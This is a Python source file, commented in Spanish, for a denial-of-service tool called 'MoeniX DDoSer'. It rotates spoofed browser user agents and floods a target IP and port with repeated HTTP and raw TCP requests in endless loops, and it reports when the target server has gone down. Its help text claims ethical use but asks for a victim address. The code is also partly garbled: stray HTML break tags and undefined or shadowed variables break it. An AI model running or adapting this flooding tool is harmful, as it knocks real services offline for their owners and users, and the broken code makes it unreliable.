def agent_user():
    global userAgent ##Creamos la variable global.
    userAgent=[]       ##Una vez declarada lo convertimos en array.
    userAgent.append("userAgent Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
    userAgent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
    userAgent.append("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")
    userAgent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
    userAgent.append("userAgent=[]Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
    userAgent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
    userAgent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
    return(userAgent)

def ejecutar_MoeniX(url): ##Parámetro de entrada el URL dado por el usuario.
    try: ##Control de excepciones.
        while True: ##Mientras esto sea verdadero, haga....
        ##En la siguiente línea de codigo abro la conexión y le paso las cabeceras con un random.choice...
        ##(Es decir, será aleatorio el User_Agent de la función agent_user). 
        request = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(userAgent)}))
        print("Conectandose y ejecutandose...\n")
        time.sleep(.1) ##Con time.sleep espero y voy obtiendo la respuesta.
    except:
        time.sleep(.1)
def verificacion():
    global peticion ##Variable global
    peticion=[]     ##Arreglo con la variable anterior
    peticion.append("http://validator.w3.org/check?uri=") ##Abro la conexión con el LINK puesto, ya que 
    ##después de /check?uri= irá la página dada por el usuario.


    return(peticion)



def down_or_up(noCrash):
    try:
        while True:
            packet = str("GET / HTTP/1.1\nHost: "+host+"\n\n User-Agent: "+random.choice(userAgent)+"\n"+data).encode('utf-8') 
            ## AF_INET se refiere a la familia de direcciones IPV4. SOCK_STREAM significa que está orientado a la conexión por el protocolo TCP.
            socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            socket.connect((host,int(port))) ##Para conectarnos al servidor, host_ip, puerto(Convertido a entero).
            if socket.sendto( packet, (host, int(port)) ):
                    socket.shutdown(1)
                    print ("\033[92m",time.ctime(time.time()),"0-94MS => Packetes enviados ---> Enviando \033[96m")
            else:<br/>
                    socket.shutdown(1)
                    print("\033[91m El servidor no responde, ¡CAIDO!...\033[0m")
            time.sleep(.1)
    except socket.error as e:
        print("¡El servidor ha caido!")
        #print("\033[91m",e,"\033[0m")
        time.sleep(.1)



def obtener_parametros(): 
    ## Definimos las variables globales
    global port
    global host
    global time
    global noCrash


    parser = OptionParser(add_help_option=False,epilog="MoeniX") ##Con la librería que importamos arriba anlizamos la secuencia de comandos
    ## Añadimos las opciones, es decir, los parámetros para el ataque, el tiempo, la ayuda y demás.
    parser.add_option("-r","--report", help="set logging to ERROR",action="store_const", dest="loglevel",const=logging.ERROR, default=logging.INFO)
    parser.add_option("-a","--server", dest="host",help="atacar el servidor(ip)")
    parser.add_option("-p","--puerto",type="int",dest="port",help="-p puerto por defecto 80.(http)")
    parser.add_option("-t","--time",type="int",dest="time",help="por defecto:  200 ejemplo de uso: -t: 300")
    parser.add_option("-h","--help",dest="help",action='store_true',help="Ayuda de parámetros...")
    parser, args = parser.parse_args()
    logging.basicConfig(level=parser.loglevel,format='%(levelname)-8s %(message)s')
    if parser.help:
            mensajes() ##Se va a la función de mensajes(), por 'mejor' código creamos una función con los mensajes.
    if parser.host is not None:
            host = parser.host
    else:<br/>
            mensajes()
    if parser.port is None:
            port = 80<br/>
    else:<br/>
            port = parser.port
    if parser.time is None:
            time = 200
    else:
            time = parser.time


def mensajes():
    print (''' \033[92m    MoeniX DDoSer versión 1.2, atacando
    y probando los servidores en modo ético. \n
    requerimientos : python versión 3.
    Ejemplo de uso:
    python moenix.py -a DIRECCION_IP_VICTIMA -p 80 -t 300
    DONDE:
    -h : Ayuda
    -a : Target, objetivo a atacar.
    -p : Puerto por donde se va a atacar.
    -t : Tiempo, por defecto 200.''')
    sys.exit() ## Salimos